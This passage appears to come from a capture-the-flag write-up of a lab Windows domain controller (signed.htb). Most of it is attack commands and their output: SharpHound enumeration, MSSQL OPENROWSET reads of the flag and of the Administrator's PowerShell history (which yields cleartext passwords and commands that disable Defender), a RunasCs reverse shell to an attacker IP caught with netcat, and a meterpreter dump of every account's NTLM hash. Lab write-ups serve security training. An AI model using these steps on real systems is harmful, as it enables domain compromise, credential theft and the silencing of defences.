Guest                    harper.diaz              henry.bennett            
isabella.evans           jackson.gray             james.morgan             
krbtgt                   liam.wright              lucas.murphy             
mia.cooper               mssqlsvc                 noah.adams               
oliver.mills             sophia.turner            william.johnson          
The command completed successfully.
```

```cmd
PS C:\> net user /domain

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            amelia.kelly             ava.morris               
charlotte.price          elijah.brooks            emma.clark               
Guest                    harper.diaz              henry.bennett            
isabella.evans           jackson.gray             james.morgan             
krbtgt                   liam.wright              lucas.murphy             
mia.cooper               mssqlsvc                 noah.adams               
oliver.mills             sophia.turner            william.johnson          
The command completed successfully.
```

```cmd
PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*SQLServer2005SQLBrowserUser$DC01
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

## Active Directory Configuration Dump

- [https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors](https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors)

We dropped `SharpHound` after we finished the quick look through manual enumeration and downloaded the `.zip-archive` through `meterpreter`.

```cmd
PS C:\temp> .\SharpHound.exe -c all
2025-10-11T14:15:07.9144985-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-10-11T14:15:08.3676236-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-10-11T14:15:08.3832460-07:00|INFORMATION|Initializing SharpHound at 2:15 PM on 10/11/2025
2025-10-11T14:15:08.7505231-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for SIGNED.HTB : DC01.SIGNED.HTB
2025-10-11T14:15:08.7738790-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-10-11T14:15:09.1488743-07:00|INFORMATION|Beginning LDAP search for SIGNED.HTB
2025-10-11T14:15:10.0551277-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-10-11T14:15:10.0551277-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-10-11T14:15:40.0707471-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2025-10-11T14:15:56.3676212-07:00|INFORMATION|Consumers finished, closing output channel
2025-10-11T14:15:56.5738956-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-10-11T14:15:56.7738722-07:00|INFORMATION|Status: 114 objects finished (+114 2.425532)/s -- Using 42 MB RAM
2025-10-11T14:15:56.7738722-07:00|INFORMATION|Enumeration finished in 00:00:47.6302244
2025-10-11T14:15:56.9301289-07:00|INFORMATION|Saving cache with stats: 73 ID to type mappings.
 74 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-10-11T14:15:56.9457488-07:00|INFORMATION|SharpHound Enumeration Completed at 2:15 PM on 10/11/2025! Happy Graphing!
```

```shell
meterpreter > download 20251011141555_BloodHound.zip
[*] Downloading: 20251011141555_BloodHound.zip -> /home/kali/20251011141555_BloodHound.zip
[*] Downloaded 12.21 KiB of 12.21 KiB (100.0%): 20251011141555_BloodHound.zip -> /home/kali/20251011141555_BloodHound.zip
[*] Completed  : 20251011141555_BloodHound.zip -> /home/kali/20251011141555_BloodHound.zip
```

## Unintended Solution

### MSSQL OPENROWSET

Unfortunately we found a way quicker and probably unintended way to grab the `root.txt` through `MSSQL OPENROWSET`.

- [https://code-white.com/blog/2015-06-reading-and-writing-files-with-mssql-openrowset/](https://code-white.com/blog/2015-06-reading-and-writing-files-with-mssql-openrowset/)

This worked because our `account` was a member of `sysadmin` and `OPENROWSET(BULK...)` executed in the context of the `SQL Server service process` which had sufficient permissions on the `file system` to read files within `C:\Users\Administrator`.

### root.txt

```shell
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
BulkColumn                                
---------------------------------------   
b'42618525cbcfc108409a44aed4a2d491\r\n
```

### Post Exploitation

#### Privilege Escalation to SYSTEM

This also allowed us to `exfiltrate` the `PowerShell History` of `Administrator` which contained his `cleartext password`.

```shell
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS x;
BulkColumn                                                                                                                                                                                                                                                        
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
b'# Domain`\n$Domain = "signed.htb"`\n`\n# Groups`\n$Groups = @("HR","IT","Finance","Developers","Support")`\n`\nforeach ($grp in $Groups) {`\n    if (-not (Get-ADGroup -Filter "Name -eq \'$grp\'" -ErrorAction SilentlyContinue)) {`\n        New-ADGroup -Name $grp -GroupScope Global -GroupCategory Security`\n    }`\n}`\n`\n# Users: Username, Password, Group`\n$Users = @(`\n    @{Username="oliver.mills";       Password="!Abc987321$"; Group="HR"},`\n    @{Username="emma.clark";         Password="!Xyz654789#"; Group="HR"},`\n    @{Username="liam.wright";        Password="!Qwe123789&"; Group="HR"},`\n`\n    @{Username="noah.adams";         Password="!ItDev456$"; Group="IT"},`\n    @{Username="ava.morris";         Password="!ItDev789#"; Group="IT"},`\n`\n    @{Username="sophia.turner";      Password="!Fin987654$"; Group="Finance"},`\n    @{Username="james.morgan";       Password="!Fin123987#"; Group="Finance"},`\n    @{Username="mia.cooper";         Password="!Fin456321&"; Group="Finance"},`\n`\n    @{Username="elijah.brooks";      Password="!Dev123456$"; Group="Developers"},`\n    @{Username="isabella.evans";     Password="!Dev789654#"; Group="Developers"},`\n    @{Username="lucas.murphy";       Password="!Dev321987&"; Group="Developers"},`\n    @{Username="william.johnson";    Password="!ItDev321&"; Group="Developers"},`\n`\n    @{Username="charlotte.price";    Password="!Sup123456$"; Group="Support"},`\n    @{Username="henry.bennett";      Password="!Sup654321#"; Group="Support"},`\n    @{Username="amelia.kelly";       Password="!Sup987123&"; Group="Support"},`\n    @{Username="jackson.gray";       Password="!Sup321654$"; Group="Support"},`\n    @{Username="harper.diaz";        Password="!Sup789321#"; Group="Support"}`\n)`\n`\nforeach ($u in $Users) {`\n    if (-not (Get-ADUser -Filter "SamAccountName -eq \'$($u.Username)\'" -ErrorAction SilentlyContinue)) {`\n        New-ADUser -Name $u.Username ``\n            -SamAccountName $u.Username ``\n            -UserPrincipalName "$($u.Username)@$Domain" ``\n            -AccountPassword (ConvertTo-SecureString $u.Password -AsPlainText -Force) ``\n            -Enabled $true ``\n            -PasswordNeverExpires $true`\n`\n        Add-ADGroupMember -Identity $u.Group -Members $u.Username`\n    }`\n}\r\nInvoke-WebRequest -Uri "https://go.microsoft.com/fwlink/?linkid=2215202&clcid=0x409&culture=en-us&country=us" -OutFile "C:\\Windows\\Tasks\\SQL2022-SSEI-Expr.exe"\r\nC:\\Windows\\Tasks\\SQL2022-SSEI-Expr.exe\r\ncd \\\r\ndir\r\ncd .\\SQL2022\\\r\ndir\r\ncd .\\Evaluation_ENU\\\r\ndir\r\n.\\SETUP.EXE /ACTION=Install\r\nget-service -Name MSSQLSERVER\r\nNew-NetFirewallRule -DisplayName "SQL Server TCP 1433" -Direction Inbound -Protocol TCP -LocalPort 1433 -Action Allow -Profile any\r\nget-service -Name MSSQLSERVER\r\nSet-Service mssqlserver -StartupType automatic\r\nget-service -Name MSSQLSERVER\r\nStart-Service mssqlserver\r\nwhoami /all\r\nsecedit /export /cfg C:\\windows\\tasks\\cur.inf\r\nnotepad C:\\windows\\tasks\\cur.inf\r\nsecedit /configure /db C:\\Windows\\Security\\local.sdb /cfg C:\\windows\\tasks\\cur.inf /areas USER_RIGHTS\r\nsc.exe privs MSSQLSERVER SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege/SeIncreaseQuotaPrivilege\r\nRestart-Service mssqlserver\r\n$zone = "DC=signed.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=signed,DC=htb"`\n$account = Get-ADUser mssqlsvc`\n`\n$acl = Get-ACL "AD:$zone"`\n$identity = New-Object System.Security.Principal.NTAccount($account.SamAccountName)`\n`\n$rights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"`\n$inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All`\n$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity,$rights,"Allow",$inheritance)`\n`\n$acl.AddAccessRule($ace)`\nSet-ACL -ACLObject $acl "AD:$zone"\r\nEnable-PSRemoting -Force\r\n$FQDN = "dc01.signed.htb"`\n$cert = New-SelfSignedCertificate -DnsName $FQDN -CertStoreLocation Cert:\\LocalMachine\\My -KeyExportPolicy Exportable -FriendlyName "WinRM HTTPS $FQDN" -NotAfter (Get-Date).AddYears(5)`\n$thumb = ($cert.Thumbprint).Replace(" ","")`\nwinrm create winrm/config/Listener?Address=*+Transport=HTTPS "@{Hostname=`"$FQDN`";CertificateThumbprint=`"$thumb`"}"\r\ntry { winrm delete winrm/config/Listener?Address=*+Transport=HTTP } catch {}\r\nSet-Item -Path WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force`\nnetsh advfirewall firewall add rule name="WinRM over HTTPS (5986)" dir=in action=allow protocol=TCP localport=5986`\nRestart-Service WinRM -Force\r\nnetstat -ano -p tcp\r\nwinrm enumerate winrm/config/listener\r\nwinrm get winrm/config\r\nNew-NetFirewallRule -DisplayName "Allow RDP - Any IP" ``\n    -Direction Inbound ``\n    -Protocol TCP ``\n    -LocalPort 3389 ``\n    -Action Allow ``\n    -Profile Any ``\n    -Enabled True ``\n    -Description "Allow RDP access from any IP address (testing only)"\r\nSet-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -DefaultOutboundAction Allow\r\nNew-NetFirewallRule -DisplayName "Allow DNS - Domain Only" ``\n    -Direction Inbound ``\n    -Protocol UDP ``\n    -LocalPort 53 ``\n    -Action Allow ``\n    -Profile Any ``\n    -Description "Allow DNS queries from domain network"\r\nGet-NetFirewallRule -Direction Inbound | Where-Object {$_.DisplayName -notlike "Allow *"} | Disable-NetFirewallRule\r\nNew-NetFirewallRule -DisplayName "Allow MSSQL - Any IP" ``\n    -Direction Inbound ``\n    -Protocol TCP ``\n    -LocalPort 1433 ``\n    -Action Allow ``\n    -Enabled True ``\n    -Profile Any ``\n    -Description "Allow MSSQL access from any IP address"\r\nls \\users\\\r\ncd .\\Desktop\\\r\nnotepad root.txt\r\nnotepad C:\\Users\\mssqlsvc\\Desktop\\user.txt\r\ndir\r\ncmd /c "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -RemoveDefinitions -All\r\npowershell -command \'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true\' \r\ndir\r\ncd \\windows\\takss\r\ncd C:\\windows\\Tasks\\\r\ndir\r\ndel *\r\ndir\r\ncd \\\r\ndir\r\ncd users\r\ncd .\\Administrator\\Desktop\\\r\nnotepad cleanup.ps1\r\ncls\r\n$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File C:\\Users\\Administrator\\Documents\\cleanup.ps1"`\n$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 365)`\n$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable`\nRegister-ScheduledTask -TaskName "Clean_DNS_Task" -Action $Action -Trigger $Trigger -Settings $Settings -User "SIGNED\\Administrator" -Password "Welcome1"\r\ncd ..\\Documents\\\r\nnotepad restart.ps1\r\nexplorer .\r\ndir ..\\Desktop\\\r\nmove ..\\Desktop\\cleanup.ps1 .\r\ndir ..\\Desktop\\\r\ndir\r\nGet-NetConnectionProfile\r\nSet-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Th1s889Rabb!t" -AsPlainText -Force) -Reset\r\nSet-Service TermService -StartupType disabled\r\nexit\r\nGet-NetConnectionProfile\r\nnltest /dsgetdc:signed.htb\r\nwusa /uninstall /kb:5065428\r\niwr http://10.10.11.90:81/vmt.exe -O vmt.exe\r\niwr http://10.10.14.62:81/vmt.exe -O vmt.exe\r\n.\\vmt.exe\r\ndel .\\vmt.exe\r\nmanage-bde -off c:\\\r\ndisable-bitlocker -mountpoint c:\\\r\npowershell iwr https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2024/06/windows10.0-kb5039217-x64_bc72f4ed75c6dd7bf033b823f79533d5772769a3.msu -O update.msu\r\n.\\update.msu\r\ndel .\\update.msu\r\ndir\r\niwr https://catalog.s.download/windowsupdate.com/c/msdownload/update/software/secu/2025/05/windows10.0-kb5058392-x64_2881b28817b6e714e61b61a50de9f68605f02bd2.msu -O updates.exe\r\niwr https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2025/05/windows10.0-kb5058392-x64_2881b28817b6e714e61b61a50de9f68605f02bd2.msu -O updates.exe\r\n.\\updates.exe.exe\r\n.\\updates.exe\r\nmove .\\updates.exe .\\updates.msu\r\n.\\updates.msu\r\ndel .\\updates.msu\r\n'
```

| Username      | Password      |
| ------------- | ------------- |
| Administrator | Th1s889Rabb!t |

With the use of `RunasCs` we then spawned a shell as `Administrator`.

- [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)

```cmd
PS C:\temp> .\RunasCs.exe -d signed.htb "Administrator" 'Th1s889Rabb!t' cmd.exe -r 10.10.16.97:6969

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-564f7$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3300 created in background.
```

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.97] from (UNKNOWN) [10.129.93.240] 56643
Microsoft Windows [Version 10.0.17763.7314]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name            SID                                          
==================== =============================================
signed\administrator S-1-5-21-4088429403-1159899800-2753317549-500


GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes                                                     
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\INTERACTIVE                      Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                                 Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group             
SIGNED\Domain Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-512 Mandatory group, Enabled by default, Enabled group             
SIGNED\Group Policy Creator Owners            Group            S-1-5-21-4088429403-1159899800-2753317549-520 Mandatory group, Enabled by default, Enabled group             
SIGNED\Enterprise Admins                      Group            S-1-5-21-4088429403-1159899800-2753317549-519 Mandatory group, Enabled by default, Enabled group             
SIGNED\Schema Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-518 Mandatory group, Enabled by default, Enabled group             
Authentication authority asserted identity    Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group             
SIGNED\Denied RODC Password Replication Group Alias            S-1-5-21-4088429403-1159899800-2753317549-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level          Label            S-1-16-12288                                                                                                 


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```shell
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:62a34972744e3c2e078677e0c177c823:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e66dab342f64c9a323012d62cd786de1:::
mssqlsvc:1103:aad3b435b51404eeaad3b435b51404ee:ef699384c3285c54128a3ee1ddb1a0cc:::
oliver.mills:1109:aad3b435b51404eeaad3b435b51404ee:21d4dcaeb62cb577227094aa72dab5f3:::
emma.clark:1110:aad3b435b51404eeaad3b435b51404ee:0ba359ab587d350c644de9c3145d8668:::
liam.wright:1111:aad3b435b51404eeaad3b435b51404ee:6e46f64af0398d58eaa71c87fd54f6b2:::
noah.adams:1112:aad3b435b51404eeaad3b435b51404ee:d48af06d555bbae68c58efe47bcd2c0d:::
ava.morris:1113:aad3b435b51404eeaad3b435b51404ee:2c8313bbe020fb9e208fb6f933c3623f:::
sophia.turner:1114:aad3b435b51404eeaad3b435b51404ee:71a04f69295d7c7a4f36b864d0a01cad:::
james.morgan:1115:aad3b435b51404eeaad3b435b51404ee:0813fe8852c857e961ca1d65b20a95f9:::
mia.cooper:1116:aad3b435b51404eeaad3b435b51404ee:9cc5251ebf86225e53a9bcac8adf1842:::
elijah.brooks:1117:aad3b435b51404eeaad3b435b51404ee:89b1e2dc085e7a9e35d64aced32835e8:::
isabella.evans:1118:aad3b435b51404eeaad3b435b51404ee:c4874b2cc244102dbede7997fdfcc443:::
lucas.murphy:1119:aad3b435b51404eeaad3b435b51404ee:9e488a69fba0e675bde844c2359176c9:::
william.johnson:1120:aad3b435b51404eeaad3b435b51404ee:b5cdbf491a0a3fd27f7d78e57ecd3a01:::
charlotte.price:1121:aad3b435b51404eeaad3b435b51404ee:7b2351de0ebd879b285a391cd22da871:::
henry.bennett:1122:aad3b435b51404eeaad3b435b51404ee:f368d7adbfcdd0690f91304ea0d81b6d:::
amelia.kelly:1123:aad3b435b51404eeaad3b435b51404ee:3f817cb56c6985322d68e753d4931fde:::
jackson.gray:1124:aad3b435b51404eeaad3b435b51404ee:e55da171150de5fdbf3a69cda4c29944:::
harper.diaz:1125:aad3b435b51404eeaad3b435b51404ee:7cd44096ab804dcbf4da88b0becd86d8:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:91d90e085c72770d23228f1b5dabaa23:::
```